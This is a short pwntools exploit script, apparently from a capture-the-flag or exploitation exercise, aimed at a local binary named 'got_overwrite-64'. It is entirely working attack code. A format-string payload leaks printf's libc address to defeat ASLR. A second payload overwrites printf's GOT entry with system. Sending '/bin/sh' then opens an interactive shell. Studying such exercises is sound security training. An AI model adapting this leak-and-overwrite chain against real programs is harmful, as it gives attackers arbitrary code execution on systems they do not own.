from pwn import *

elf = context.binary = ELF('./got_overwrite-64')
libc = elf.libc

p = process()

# ASLR bypass
payload = b'%7$s'
payload += b'||||'
payload += p64(elf.got['printf'])

p.sendline(payload)

printf_leak = u64(p.recv(6) + b'\x00\x00')
libc.address = printf_leak - libc.sym['printf']

p.clean()

# GOT Overwrite
payload = fmtstr_payload(6, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.sendline('/bin/sh')

p.clean()

p.interactive()